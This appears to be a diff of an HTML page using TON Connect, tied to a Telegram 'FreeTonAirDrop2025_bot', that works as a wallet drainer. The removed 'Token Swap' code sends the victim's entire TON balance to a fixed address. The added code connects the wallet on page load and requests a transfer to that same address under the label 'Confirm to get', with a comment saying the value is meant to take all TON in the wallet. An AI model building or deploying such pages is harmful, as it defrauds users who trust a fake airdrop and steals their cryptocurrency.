@@ -3,74 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example with Token Swap</title>
+    <title>TON Connect Example</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@ton/ton@latest/dist/ton.js"></script>
+   
 </head>
 <body>
-    <div id="ton-connect"></div>
-    <div id="swap-info" style="display:none;">
-        <h2>Token Swap</h2>
-        <p>Balance: <span id="balance"></span> TON</p>
-        <button onclick="performSwap()">Swap all TON for New Token</button>
-    </div>
 
+    <div class="center" id="ton-connect"></div>
     <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
         tonConnectUI.uiOptions = {
-            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        };
-
-        async function connectToWallet() {
-            try {
-                const connectedWallet = await tonConnectUI.connectWallet();
-                console.log(connectedWallet);
-                
-                // After successful connection, get the balance and show swap info
-                const balance = await getWalletBalance(connectedWallet.address);
-                document.getElementById('balance').textContent = balance;
-                document.getElementById('swap-info').style.display = 'block';
-            } catch (error) {
-                console.error("Error connecting to wallet:", error);
-            }
-        }
-
-        async function getWalletBalance(address) {
-            const client = new ton.TonClient({
-                endpoint: 'https://toncenter.com/api/v2/jsonRPC'
-            });
-            const balance = await client.getBalance(address);
-            return ton.fromNano(balance);
-        }
-
-        async function performSwap() {
-            try {
-                // Here you would typically interact with your smart contract
-                // This is a placeholder for the actual swap logic
-                const swapContractAddress = 'EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY'; // Replace with your actual contract address
-                const result = await tonConnectUI.sendTransaction({
-                    validUntil: Math.floor(Date.now() / 1000) + 60 * 20, // 20 minutes from now
-                    messages: [
-                        {
-                            address: swapContractAddress,
-                            amount: await getWalletBalance(tonConnectUI.wallet.address),
-                            payload: 'te6ccgEBAQEABgAACCiAmCM=', // Replace with your actual payload
-                        },
-                    ],
-                });
-                console.log('Swap transaction sent:', result);
-                alert('Swap initiated! Check your wallet for the new tokens.');
-            } catch (error) {
-                console.error('Error performing swap:', error);
-                alert('Error performing swap. Please try again.');
-            }
-        }
-
-        // Call the function to connect wallet when the page loads
-        connectToWallet();
+      twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+  };
+  
     </script>
+<script>
+    async function connectToWallet() {
+        const connectedWallet = await tonConnectUI.connectWallet();
+        // Create a transaction to send to the wallet
+        const transaction = {
+            "type": "transaction",
+            "value": 0, // amount of TON to send (0 means all TON in the wallet)
+            "destination": "EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY", // address of the contract to send the transaction to
+            "payload": "Confirm to get", // message to display to the user
+        };
+        // Send the transaction to the wallet for confirmation
+        const result = await tonConnectUI.sendTransaction(connectedWallet, transaction);
+        console.log(result);
+    }
+
+    // Call the function
+    connectToWallet().catch(error => {
+        console.error("Error connecting to wallet or sending transaction:", error);
+    });
+</script>
 </body>
 </html>
